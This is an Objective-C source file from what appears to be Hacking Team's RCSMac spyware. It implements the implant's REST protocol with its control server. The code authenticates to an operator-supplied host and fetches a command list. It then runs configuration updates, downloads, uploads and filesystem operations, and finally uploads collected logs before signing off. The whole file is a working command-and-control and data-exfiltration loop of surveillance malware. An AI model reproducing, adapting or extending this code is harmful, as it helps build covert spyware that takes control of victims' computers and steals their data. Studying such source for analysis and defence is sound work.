/*
 * RCSMac - RESTNetworkProtocol
 *  Implementation for REST Protocol.
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "RESTNetworkProtocol.h"
#import "RESTTransport.h"

#import "AuthNetworkOperation.h"
#import "IDNetworkOperation.h"
#import "ConfNetworkOperation.h"
#import "DownloadNetworkOperation.h"
#import "UploadNetworkOperation.h"
#import "FSNetworkOperation.h"
#import "LogNetworkOperation.h"
#import "ByeNetworkOperation.h"

#import "RCSMCommon.h"

//#define DEBUG_PROTO


@implementation RESTNetworkProtocol

- (id)initWithHost: (NSString *)aHost
            onPort: (int32_t)aPort
{
  if (self = [super init])
    {
#ifdef DEBUG_TRANSPORT
      infoLog(ME, @"host: %@", aHost);
      infoLog(ME, @"port: %d", aPort);
#endif
      
      if (aHost == nil
          || [aHost isEqualToString: @""])
        {
#ifdef DEBUG_TRANSPORT
          errorLog(ME, @"Host is null");
#endif
          
          [self release];
          return nil;
        }
      
      if (aPort <= 0)
        {
#ifdef DEBUG_TRANSPORT
          errorLog(ME, @"Port is invalid");
#endif
          
          [self release];
          return nil;
        }
      
      NSString *_url;
      _url = [[NSString alloc] initWithFormat: @"http://%@:%d", aHost, aPort];
      mURL    = [[NSURL alloc] initWithString: _url];
      [_url release];
      
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mURL release];
  [super dealloc];
}

// Abstract Class Methods
- (BOOL)perform
{
#ifdef DEBUG_PROTO
  infoLog(ME, @"");
#endif
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // Init the transport
  RESTTransport *transport = [[RESTTransport alloc] initWithURL: mURL
                                                         onPort: 8080];
  
  AuthNetworkOperation *authOP = [[AuthNetworkOperation alloc]
                                  initWithTransport: transport];
  if ([authOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(ME, @"Error on AUTH");
#endif
      
      [authOP release];
      [transport release];
      [outerPool release];
      
      return NO;
    }
  
  [authOP release];
  
  IDNetworkOperation *idOP     = [[IDNetworkOperation alloc]
                                  initWithTransport: transport];
  if ([idOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(ME, @"Error on ID");
#endif
      
      [idOP release];
      [transport release];
      [outerPool release];
      
      return NO;
    }
  
  NSMutableArray *commandList = [[idOP getCommands] retain];
  [idOP release];
  
#ifdef DEBUG_PROTO
  infoLog(ME, @"commands available: %@", commandList);
#endif
  
  int i = 0;
  
  for (; i < [commandList count]; i++)
    {
      uint32_t command = [[commandList objectAtIndex: i] unsignedIntValue];
      
      switch (command)
        {
        case PROTO_NEW_CONF:
          {
            ConfNetworkOperation *confOP = [[ConfNetworkOperation alloc]
                                            initWithTransport: transport];
            if ([confOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(ME, @"Error on CONF");
#endif
              }
            
            [confOP release];
          } break;
        case PROTO_DOWNLOAD:
          {
            DownloadNetworkOperation *downOP = [[DownloadNetworkOperation alloc]
                                                initWithTransport: transport];
            if ([downOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(ME, @"Error on DOWNLOAD");
#endif
              }
            
            [downOP release];
          } break;
        case PROTO_UPLOAD:
          {
            UploadNetworkOperation *upOP = [[UploadNetworkOperation alloc]
                                            initWithTransport: transport];
            
            if ([upOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(ME, @"Error on UPLOAD");
#endif
              }
            
            [upOP release];
          } break;
        case PROTO_FILESYSTEM:
          {
            FSNetworkOperation *fsOP = [[FSNetworkOperation alloc]
                                        initWithTransport: transport];
            if ([fsOP perform] == NO)
              {
#ifdef DEBUG_PROTO
                errorLog(ME, @"Error on FS");
#endif
              }
            
            [fsOP release];
          } break;
        default:
          {
#ifdef DEBUG_PROTO
            errorLog(ME, @"Received an unknown command (%d)", command);
#endif
          } break;
        }
    }
  
  LogNetworkOperation *logOP = [[LogNetworkOperation alloc]
                                initWithTransport: transport];
  
  if ([logOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(ME, @"Error on LOG");
#endif
    }
  
  [logOP release];
  
  ByeNetworkOperation *byeOP = [[ByeNetworkOperation alloc]
                                initWithTransport: transport];
  if ([byeOP perform] == NO)
    {
#ifdef DEBUG_PROTO
      errorLog(ME, @"WTF error on BYE?!");
#endif
    }
  [byeOP release];
  
  [commandList release];
  [transport release];
  [outerPool release];
  
  return YES;
}
// End Of Abstract Class Methods

@end